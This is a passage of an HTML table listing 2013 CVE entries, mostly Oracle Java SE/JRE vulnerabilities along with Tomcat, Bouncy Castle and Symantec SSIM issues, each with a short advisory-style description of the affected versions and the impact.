		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Libraries, a different vulnerability than CVE-2013-2452 and CVE-2013-2455.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is due to an incorrect "checking order" within the AccessControlContext class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2442">CVE-2013-2442</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2466 and CVE-2013-2468.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2441">CVE-2013-2441</a></td>
		<td valign="top">Unspecified vulnerability in the Agile EDM component in Oracle Supply Chain Products Suite 6.1.1.0, 6.1.2.0, and 6.1.2.2 allows remote authenticated users to affect integrity via unknown vectors related to Java Client.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2440">CVE-2013-2440</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2435.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2439">CVE-2013-2439</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, 5.0 Update 41 and earlier, and JavaFX 2.2.7 and earlier allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2438">CVE-2013-2438</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier allows remote attackers to affect integrity via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2437">CVE-2013-2437</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2436">CVE-2013-2436</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2013-1488 and CVE-2013-2426.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect "type checks" and "method handle binding" involving Wrapper.convert.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2435">CVE-2013-2435</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2440.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2434">CVE-2013-2434</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2433">CVE-2013-2433</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-1540.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2432">CVE-2013-2432</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, 5.0 Update 41 and earlier, and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-2394 and CVE-2013-1491.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2431">CVE-2013-2431</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to HotSpot.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to bypassing the Java sandbox using "method handle intrinsic frames."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2430">CVE-2013-2430</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; JavaFX 2.2.7 and earlier; and OpenJDK 6 and 7 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to ImageIO. NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "JPEGImageReader state corruption" when using native code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2429">CVE-2013-2429</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to ImageIO.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "JPEGImageWriter state corruption" when using native code, which triggers memory corruption.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2428">CVE-2013-2428</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX, a different vulnerability than CVE-2013-0402, CVE-2013-2414, and CVE-2013-2427.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2427">CVE-2013-2427</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX, a different vulnerability than CVE-2013-0402, CVE-2013-2414, and CVE-2013-2428.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2426">CVE-2013-2426</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect invocation of the defaultReadObject method in the ConcurrentHashMap class, which allows remote attackers to bypass the Java sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2425">CVE-2013-2425</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2424">CVE-2013-2424</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality via vectors related to JMX. NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "insufficient class access checks" when "creating new instances" using MBeanInstantiator.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2423">CVE-2013-2423</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 7, allows remote attackers to affect integrity via unknown vectors related to HotSpot.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from the original researcher that this vulnerability allows remote attackers to bypass permission checks by the MethodHandles method and modify arbitrary public final fields using reflection and type confusion, as demonstrated using integer and double fields to disable the security manager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2422">CVE-2013-2422</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to improper method-invocation restrictions by the MethodUtil trampoline class, which allows remote attackers to bypass the Java sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2421">CVE-2013-2421</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to HotSpot.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect MethodHandle lookups, which allows remote attackers to bypass Java sandbox restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2420">CVE-2013-2420</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to insufficient "validation of images" in share/native/sun/awt/image/awt_ImageRep.c, possibly involving offsets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2419">CVE-2013-2419</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect availability via unknown vectors related to 2D.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "font processing errors" in the International Components for Unicode (ICU) Layout Engine before 51.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2418">CVE-2013-2418</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2417">CVE-2013-2417</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect availability via unknown vectors related to Networking.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to an information leak involving InetAddress serialization. CVE has not investigated the apparent discrepancy between vendor reports regarding the impact of this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2416">CVE-2013-2416</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2415">CVE-2013-2415</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 6 and 7, allows local users to affect confidentiality via vectors related to JAX-WS.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "processing of MTOM attachments" and the creation of temporary files with weak permissions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2414">CVE-2013-2414</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX, a different vulnerability than CVE-2013-0402, CVE-2013-2427, and CVE-2013-2428.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2412">CVE-2013-2412</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Serviceability.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to insufficient indication of an SSL connection failure by JConsole, related to RMI connection dialog box.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2407">CVE-2013-2407</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality and availability via unknown vectors related to Libraries.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "XML security and the class loader."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2400">CVE-2013-2400</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-3744.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2394">CVE-2013-2394</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, 5.0 Update 41 and earlier, and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-2432 and CVE-2013-1491.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2384">CVE-2013-2384</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-1569, CVE-2013-2383, and CVE-2013-2420. NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "font layout" in the International Components for Unicode (ICU) Layout Engine before 51.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2383">CVE-2013-2383</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-1569, CVE-2013-2384, and CVE-2013-2420. NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "handling of [a] glyph table" in the International Components for Unicode (ICU) Layout Engine before 51.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2172">CVE-2013-2172</a></td>
		<td valign="top">jcp/xml/dsig/internal/dom/DOMCanonicalizationMethod.java in Apache Santuario XML Security for Java 1.4.x before 1.4.8 and 1.5.x before 1.5.5 allows context-dependent attackers to spoof an XML Signature by using the CanonicalizationMethod parameter to specify an arbitrary weak "canonicalization algorithm to apply to the SignedInfo part of the Signature."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2071">CVE-2013-2071</a></td>
		<td valign="top">java/org/apache/catalina/core/AsyncContextImpl.java in Apache Tomcat 7.x before 7.0.40 does not properly handle the throwing of a RuntimeException in an AsyncListener in an application, which allows context-dependent attackers to obtain sensitive request information intended for other applications in opportunistic circumstances via an application that records the requests that it processes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2067">CVE-2013-2067</a></td>
		<td valign="top">java/org/apache/catalina/authenticator/FormAuthenticator.java in the form authentication feature in Apache Tomcat 6.0.21 through 6.0.36 and 7.x before 7.0.33 does not properly handle the relationships between authentication requirements and sessions, which allows remote attackers to inject a request into a session by sending this request during completion of the login form, a variant of a session fixation attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2035">CVE-2013-2035</a></td>
		<td valign="top">Race condition in hawtjni-runtime/src/main/java/org/fusesource/hawtjni/runtime/Library.java in HawtJNI before 1.8, when a custom library path is not specified, allows local users to execute arbitrary Java code by overwriting a temporary JAR file with a predictable name in /tmp.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1927">CVE-2013-1927</a></td>
		<td valign="top">The IcedTea-Web plugin before 1.2.3 and 1.3.x before 1.3.2 allows remote attackers to execute arbitrary code via a crafted file that validates as both a GIF and a Java JAR file, aka "GIFAR."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1869">CVE-2013-1869</a></td>
		<td valign="top">CRLF injection vulnerability in spacewalk-java before 2.1.148-1 and Red Hat Network (RHN) Satellite 5.6 allows remote attackers to inject arbitrary HTTP headers, and conduct HTTP response splitting attacks and cross-site scripting (XSS) attacks, via the return_url parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1717">CVE-2013-1717</a></td>
		<td valign="top">Mozilla Firefox before 23.0, Firefox ESR 17.x before 17.0.8, Thunderbird before 17.0.8, Thunderbird ESR 17.x before 17.0.8, and SeaMonkey before 2.20 do not properly restrict local-filesystem access by Java applets, which allows user-assisted remote attackers to read arbitrary files by leveraging a download to a fixed pathname or other predictable pathname.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1624">CVE-2013-1624</a></td>
		<td valign="top">The TLS implementation in the Bouncy Castle Java library before 1.48 and C# library before 1.8 does not properly consider timing side-channel attacks on a noncompliant MAC check operation during the processing of malformed CBC padding, which allows remote attackers to conduct distinguishing attacks and plaintext-recovery attacks via statistical analysis of timing data for crafted packets, a related issue to CVE-2013-0169.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1615">CVE-2013-1615</a></td>
		<td valign="top">The management console (aka Java console) on the Symantec Security Information Manager (SSIM) appliance 4.7.x and 4.8.x before 4.8.1 allows remote attackers to obtain sensitive information via unspecified web-GUI API calls.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1614">CVE-2013-1614</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the management console (aka Java console) on the Symantec Security Information Manager (SSIM) appliance 4.7.x and 4.8.x before 4.8.1 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1613">CVE-2013-1613</a></td>
		<td valign="top">SQL injection vulnerability in the management console (aka Java console) on the Symantec Security Information Manager (SSIM) appliance 4.7.x and 4.8.x before 4.8.1 allows remote authenticated users to execute arbitrary SQL commands via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1571">CVE-2013-1571</a></td>
		<td valign="top">Unspecified vulnerability in the Javadoc component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier; JavaFX 2.2.21 and earlier; and OpenJDK 7 allows remote attackers to affect integrity via unknown vectors related to Javadoc. NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to frame injection in HTML that is generated by Javadoc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1569">CVE-2013-1569</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "checking of [a] glyph table" in the International Components for Unicode (ICU) Layout Engine before 51.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1564">CVE-2013-1564</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to affect integrity via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1563">CVE-2013-1563</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1561">CVE-2013-1561</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to affect confidentiality via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1558">CVE-2013-1558</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Beans.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1557">CVE-2013-1557</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via vectors related to RMI.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "missing security restrictions" in the LogStream.setDefaultStream method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1540">CVE-2013-1540</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and 6 Update 43 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2433.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1537">CVE-2013-1537</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via vectors related to RMI.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to the default java.rmi.server.useCodebaseOnly setting of false, which allows remote attackers to perform "dynamic class downloading" and execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1518">CVE-2013-1518</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAXP.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "missing security restrictions."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1500">CVE-2013-1500</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows local users to affect confidentiality and integrity via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to weak permissions for shared memory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1493">CVE-2013-1493</a></td>
		<td valign="top">The color management (CMM) functionality in the 2D component in Oracle Java SE 7 Update 15 and earlier, 6 Update 41 and earlier, and 5.0 Update 40 and earlier allows remote attackers to execute arbitrary code or cause a denial of service (crash) via an image with crafted raster parameters, which triggers (1) an out-of-bounds read or (2) memory corruption in the JVM, as exploited in the wild in February 2013.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1491">CVE-2013-1491</a></td>
		<td valign="top">The Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, 5.0 Update 41 and earlier, and JavaFX 2.2.7 and earlier allows remote attackers to execute arbitrary code via vectors related to 2D, as demonstrated by Joshua Drake during a Pwn2Own competition at CanSecWest 2013.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1490">CVE-2013-1490</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7 Update 11 (JRE 1.7.0_11-b21) allows user-assisted remote attackers to bypass the Java security sandbox via unspecified vectors, aka "Issue 51," a different vulnerability than CVE-2013-0431.  NOTE: as of 20130130, this vulnerability does not contain any independently-verifiable details, and there is no vendor acknowledgement. A CVE identifier is being assigned because this vulnerability has received significant public attention, and the original researcher has an established history of releasing vulnerability reports that have been fixed by vendors.  NOTE: this issue also exists in SE 6, but it cannot be exploited without a separate vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1489">CVE-2013-1489</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 10 and Update 11, when running on Windows using Internet Explorer, Firefox, Opera, and Google Chrome, allows remote attackers to bypass the "Very High" security level of the Java Control Panel and execute unsigned Java code without prompting the user via unknown vectors, aka "Issue 53" and the "Java Security Slider" vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1488">CVE-2013-1488</a></td>
		<td valign="top">The Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 6 and 7, allows remote attackers to execute arbitrary code via unspecified vectors involving reflection, Libraries, "improper toString calls," and the JDBC driver manager, as demonstrated by James Forshaw during a Pwn2Own competition at CanSecWest 2013.

</td>
	</tr>
	<tr>
